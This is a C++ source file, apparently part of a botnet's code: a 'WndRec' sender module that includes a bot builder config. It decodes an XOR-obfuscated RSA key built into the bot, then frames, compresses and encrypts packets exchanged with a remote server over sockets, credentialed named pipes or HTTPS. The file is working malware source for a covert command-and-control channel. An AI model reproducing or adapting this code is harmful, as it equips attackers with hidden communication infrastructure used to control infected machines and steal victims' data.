#include "core\core.h"
#include "core\rand.h"
#include "core\file.h"
#include <winsock2.h>
#include <windows.h>
#include "WndRec\WndRec.h"
#include <memory.h>
#include "WndRec\sender.h"
#include "WndRec\lzw.h"
#include "..\..\Bot\config\builder.h"

namespace Config
{
extern char PublicKey[MaxSizePublicKey];
}

namespace WndRec
{

#pragma pack(1)
struct Packet
{
	byte cmd;
	byte ver; //верси€ заголовка
	uint fullSize; //если пакет разбитый на части, то тут полный его размер
	ushort size; //переданный размер
	ushort num; //пор€дковый номер переданной части
	byte type; //флаги: 1 - 0 - несжатый пакет, 1 - сжатый пакет; 2 - 1 - последн€€ часть пакета
	uint id; //уникальный идентификатор пакета, который возвращаетс€ сервером, чтобы знать на какую команду пришел ответ
	uint crc; //CRC32, пока не используетс€ 
	byte reserve[5]; //резервируем до размера 24 байта
};
#pragma pack()

const int SizeBuffer = 8192;
//дл€ шифровани€ если размер данных кратен 16, то зашифрованный фрагмент всегда на 16 больше
int Align16( int sz )
{
	return (sz + 16) / 16 * 16;
}

//декодирует публичный rsa ключ
static void GetPublicKey( Mem::Data& key )
{
	key.Copy( Config::PublicKey, MaxSizePublicKey );
	int xor = 0;
	for( int i = 0; i < MaxSizePublicKey - 2; i++ )
	{
		key.p_byte()[i + 2] ^= key.p_byte()[xor++];
		if( xor == 2 ) xor = 0;
	}
	int sz = key.p_byte()[2];
	key.DelLeft(3);
	key.SetLen(sz);
}

SenderBuf* InitPacketBuf( byte* mask, int c_mask )
{
	SenderBuf* sb = new SenderBuf();
	while( sb )
	{
		//sb->c_mask = Rand::Gen( sizeof(sb->mask) / 2, sizeof(sb->mask) );
		//Rand::Gen( sb->mask, sb->c_mask );
		//sb->c_mask = 0; 
		/*
		if( sizeof(sb->mask) < c_mask ) c_mask = sizeof(sb->mask);
		Mem::Copy( sb->mask, mask, c_mask );
		sb->c_mask = c_mask;
		*/
		//sb->verPacket = 255; //пока не знаем какую версию пакетов поддерживает сервер
		sb->verPacket = 3;

		GetPublicKey(sb->publicKey);
		sb->realBytes = 0;
		sb->lzwBytes = 0;

		if( sb->bufForRead.MakeEnough(SizeBuffer) && sb->bufHead.MakeEnough(32) )
		{
			sb->bufForLzw = (char*)Mem::Alloc(SizeBuffer);
			sb->codes = create_table_lzw();
			if( sb->bufForLzw && sb->codes )
				break;
		}
		sb->rsa = true;
		ReleasePacketBuf(sb);
		sb = 0;
		break;
	}
	return sb;
}

void ReleasePacketBuf(SenderBuf* sb)
{
	if( sb )
	{
		Mem::Free(sb->bufForLzw);
		release_table_lzw(sb->codes);
		delete sb;
	}
}

void ResetBuf(SenderBuf* sb)
{
	if( sb )
		sb->bufForRead.SetLen(0);
}

/*
static int ReadSocket( SenderBuf* sb, int sc, void* data, int c_data, int wait )
{
	int ret = 0;
	if( sc == 0 ) //очистка буфера
	{
		sb->readedBuf = 0;
	}
	else
	{
		for(;;)
		{
			if( sb->readedBuf >= c_data )
			{
				u_memcpy( (char*)data, sb->BufForRead, c_data );
				u_memcpy( sb->BufForRead, sb->BufForRead + c_data, sb->readedBuf - c_data );
				sb->readedBuf -= c_data;
				ret = c_data;
				break;
			}
            fd_set fdsr;
            fdsr.fd_count = 1;
            fdsr.fd_array[0] = sc;
            timeval waitEvent;
            waitEvent.tv_sec = 0;
            waitEvent.tv_usec = wait;

            int events = select( 0, &fdsr, NULL, NULL, &waitEvent );
            if( events == 0 ) return -1; //ничего не пришло, нужно ждать
            if( events == SOCKET_ERROR ) 
			{
//				int err = WSAGetLastError();
//				DbgMsg( "Error2 %d, size %d", err, c_data );
				break;
			}

			int c = recv( sc, sb->BufForRead + sb->readedBuf, SizeBuffer - sb->readedBuf, 0 );
			if( c == SOCKET_ERROR || c == 0 )
			{
//				int err = WSAGetLastError();
//				DbgMsg( "Error3 %d, size %d, recv %d", err, c_data, c );
				break;
			}
			sb->readedBuf += c;
		}
	}
	return ret;
}
*/
/*
static void XorMask( SenderBuf* sb, byte* data, int c_data )
{
	if( sb->c_mask <= 0 ) return;
	byte* p = data;
	byte* pm = sb->mask;
	int cm = sb->c_mask;
	while( c_data-- > 0 )
	{
		*p++ ^= *pm++;
		if( --cm == 0 )
		{
			pm = sb->mask;
			cm = sb->c_mask;
		}
	}
}

static void XorMask2( SenderBuf* sb, byte* data, int c_data )
{
	if( sb->c_mask <= 0 ) return;
	byte* p = data;
	byte* pm = sb->mask;
	int cm = sb->c_mask;
	while( c_data-- > 0 )
	{
		*p++ ^= pm[cm - 1];
		if( --cm == 0 )
		{
			pm = sb->mask;
			cm = sb->c_mask;
		}
	}
}
*/

bool WritePacket( SenderBuf* sb, IOServer& io, const void* data, int c_data )
{
	Mem::Data data2;
	data2.Copy( data, c_data );
//	DbgMsg( "pre len %d, %02x.%02x.%02x.%02x....", c_data, (uint)data2.p_byte()[0], (uint)data2.p_byte()[1], (uint)data2.p_byte()[2], (uint)data2.p_byte()[3] );
	if( sb->rsa )
		EncryptRSA( sb->publicKey, data2 );
	else
		EncryptAES256( sb->aesKey, data2 );
//	DbgMsg( "rsa %d, len %d, %02x.%02x.%02x...", (int)sb->rsa, data2.Len(), (uint)data2.p_byte()[0], (uint)data2.p_byte()[1], (uint)data2.p_byte()[2] );
//	if( Socket::Write( sc, data2.Ptr(), data2.Len() ) == SOCKET_ERROR )
	if( io.Write(data2) == SOCKET_ERROR )
		return false;
	return true;
}

//¬Ќ»ћјЌ»≈: данной функцией можно пользоватьс€ из параллельных потоков только в случае, если размер
//передаваемых данных меньше 150 байт, в этом случае не используетс€ сжатие и данные напр€мую шлютс€ в сокет
bool WritePacket( SenderBuf* sb, int cmd, IOServer& io, void* data, int c_data, uint id )
{
	bool ret = true;
	Packet p;
	p.cmd = cmd;
	p.ver = sb->verPacket;
	p.fullSize = c_data;
	p.num = 0;
	p.id = id;
	Rand::Gen( (byte*)&p.crc, 4 );
	do
	{
		p.type = 0;
		int sz = c_data;
		if( sz > 4096 )
			sz = 4096;
		else
			p.type |= 2; //последн€€ часть (возможно единственна€)
		int szLzw = sz > 150 ? to_lzw( sb->codes, (unsigned char*)data, sz, (unsigned char*)sb->bufForLzw ) : -1;
		void* sendData; //данные на отправку
		int sendSz; //размер отправл€емых данных
		if( szLzw > 0 ) //запаковали
		{
			sendData = sb->bufForLzw;
			sendSz = szLzw;
			p.type |= 1; //сжатый пакет
		}
		else
		{
			Mem::Copy( sb->bufForLzw, data, sz );
			sendData = sb->bufForLzw;
			sendSz = sz;
		}
		p.size = sendSz;
		sb->realBytes += sz;
		sb->lzwBytes += sendSz;
		//DbgMsg( "-- real: %d(%d), lzw: %d(%d)", sz, sb->realBytes, sendSz, sb->lzwBytes );
		if( !WritePacket( sb, io, &p, sizeof(p) ) )
		{
			ret = false; 
			break;
		}
		if( sendData && sendSz > 0 )
		{
			if( !WritePacket( sb, io, sendData, sendSz ) )
			{
				ret = false;
				break;
			}
		}
		c_data -= sz;
		p.num++;
		data = (char*)data + sz;
	} while( c_data > 0 );
	return ret;
}

int ReadPacket( SenderBuf* sb, int& cmd, IOServer& io, void** data, int wait, uint* id )
{
	Packet* p;
	sb->bufForRead.SetLen(0);
	int recvSz = 0;
	char* recvData = 0;
	bool multiPart = false; //true - если принимает разбитый на части пакет
	do
	{
		sb->bufHead.SetLen(0);
//		int res = Socket::Read( sc, sb->bufHead, Align16(sizeof(Packet)), wait );
		int res = io.Read( sb->bufHead, Align16(sizeof(Packet)), wait );
		if( res == 3 ) //если врем€ вышло
			return -1;
		if( res == 0 || res == 2 ) 
			return 0;

		DecryptAES256( sb->aesKey, sb->bufHead, 0 );
		p = (Packet*)sb->bufHead.Ptr();

		if( p->cmd == 0 || p->size <= 0 ) 
			return 0;
//если пакет без данных, то эмулируем присылку одного байта, так как нельз€ возвращать в таких случа€х 
//0 так как это означет обрыв св€зи	
		int received = 0; //количество прин€тых байт, дл€ сбора частей
		if( p->size == 0 ) 
			res = 1;
		else
		{
			if( p->num == 0 && (p->type & 2) == 0 ) //пришла 1-€ часть разбитого пакета
			{
				if( !sb->bufForRead.MakeEnough(Align16(p->fullSize)) ) return 0;
				multiPart = true;
			}
			received = sb->bufForRead.Len();
//			res = Socket::Read(sc, sb->bufForRead, Align16(p->size), 60 * 1000 );
			res = io.Read( sb->bufForRead, Align16(p->size), 60 * 1000 );
		}
		if( res <= 0 ) 
			return res;
		if( res == 3 )
			return -1;
		DecryptAES256( sb->aesKey, sb->bufForRead, received );
		
		sb->verPacket = p->ver; //запоминаем версию пакетов с которыми работает сервер
		if( p->type & 1 ) //запакованный пакет
		{
			int szDepack = from_lzw( sb->codes, (byte*)sb->bufForRead.Ptr() + received, (byte*)sb->bufForLzw );
			if( multiPart )
			{
				sb->bufForRead.SetLen(received);
				sb->bufForRead.Append( sb->bufForLzw, szDepack );
				recvData = sb->bufForRead.p_char();
				recvSz = sb->bufForRead.Len();
			}
			else
			{
				recvData = sb->bufForLzw;
				recvSz = szDepack;
			}
		}
		else
		{
			recvData = sb->bufForRead.p_char();
			recvSz = sb->bufForRead.Len();
		}
	} while( (p->type & 2) == 0 ); //это не последн€€ часть пакета
	if( DWORD(*data) != DWORD(-1) )
	{
		*data = Mem::Alloc(recvSz);
		Mem::Copy( (char*)*data, recvData, recvSz );
	}
	else
		*data = recvData;
	cmd = p->cmd;
	if( id ) *id = p->id;
	//DbgMsg( "read packet id %d, cmd %d, size %d", *id, cmd, recvSz );
    return recvSz;
}

void* CreateRawPacket( int begSize, int cmd, const void* data, int c_data, int& c_packet )
{
/*
	c_packet = sizeof(Packet) + c_data + begSize;
	byte* ret =(byte*)Mem::Alloc(c_packet);
	Packet* p = (Packet*)(ret + begSize);
	p->cmd = cmd;
	p->ver = 1;
	p->fullSize = c_data;
	p->num = 0;
	p->id = 0;
	p->crc = 0;
	p->type = 2;
	p->size = c_data;
	Mem::Copy( (byte*)p + sizeof(Packet), data, c_data );
	return ret;
*/
	Mem::Data key, data1(sizeof(Packet)), data2(c_data);

	Packet* p = (Packet*)data1.Ptr();
	p->cmd = cmd;
	p->ver = 1;
	p->fullSize = c_data;
	p->num = 0;
	p->id = 0;
	p->crc = 0;
	p->type = 2;
	p->size = c_data;
	data1.SetLen(sizeof(Packet));

	data2.Copy( data, c_data );

	GetPublicKey(key);
	EncryptRSA( key, data1 );
	EncryptRSA( key, data2 );

	c_packet = begSize + data1.Len() + data2.Len();
	void* ret = Mem::Alloc(c_packet);
	Mem::Copy( (byte*)ret + begSize, data1.Ptr(), data1.Len() );
	Mem::Copy( (byte*)ret + begSize + data1.Len(), data2.Ptr(), data2.Len() );

	return ret;
}

void IOServer::Init()
{
	typeIO = 0;
	sc = 0;
	pipe = 0;
	https = 0;
}

bool IOServer::ConnectIP( const char* ip, int port )
{
	typeIO = 1;
	sc = Socket::ConnectIP( ip, port );
	return sc > 0;
}

bool IOServer::ConnectPipe( const char* namePipe )
{
	typeIO = 2;
	char namePipe2[128];
	Str::Copy( namePipe2, sizeof(namePipe2), namePipe );
	char* user = 0;
	char* psw = 0;
	int n = Str::IndexOf( namePipe2, '@' );
	if( n > 0 )
	{
		namePipe2[n] = 0; //закончили им€ пайпа, далее юзер
		user = namePipe2 + n + 1;
		n = Str::IndexOf( user, '#' );
		if( n > 0 )
		{
			user[n] = 0; //закончилось им€ юзера, далее пароль
			psw = user + n + 1;
		}
	}
	DbgMsg( "Connect to remote pipe %s, user %s, psw %s", namePipe2, user, psw );
	pipe = new PipeSocketClient( namePipe2, user, psw );
	sc = pipe->ConnectIP( 0, 0 );
	return sc > 0;
}

bool IOServer::ConnectHttps( const char* ip )
{
	typeIO = 3;
	https = new HTTPS();
	return https->Connect(ip);
}

void IOServer::Close()
{
	switch( typeIO )
	{
		case 1:
			Socket::Close(sc);
			sc = 0;
			break;
		case 2:
			if( pipe )
			{
				pipe->Close(sc);
				delete pipe;
				pipe = 0;
				sc = 0;
			}
			break;
		case 3:
			if( https )
			{
				https->Close();
				delete https;
				https = 0;
			}
			break;
	}
}


int IOServer::Write( Mem::Data& data )
{
	switch( typeIO )
	{
		case 1:
			return Socket::Write( sc, data.Ptr(), data.Len() );
		case 2:
			if( pipe != 0 )
				return pipe->Write( sc, data.Ptr(), data.Len() );
			else
				return SOCKET_ERROR;
		case 3:
			if( https )
				return https->Write(data);
			else
				return SOCKET_ERROR;
	}
	return -1;
}
int IOServer::Read( Mem::Data& data, int maxRead, int wait )
{
	switch( typeIO )
	{
		case 1:
			return Socket::Read( sc, data, maxRead, wait );
		case 2:
			if( pipe != 0 )
				return pipe->Read( sc, data, maxRead, wait );
			else
				return SOCKET_ERROR;
		case 3:
			if( https )
				return https->Read( data, maxRead, wait );
			else
				return SOCKET_ERROR;
	}
	return -1;
}

bool IOServer::Connected()
{
	switch( typeIO )
	{
		case 1:
			return sc > 0;
		case 2:
			return sc > 0;
		case 3:
			return https != 0 && https->Connected();
	}
	return false;
}

}

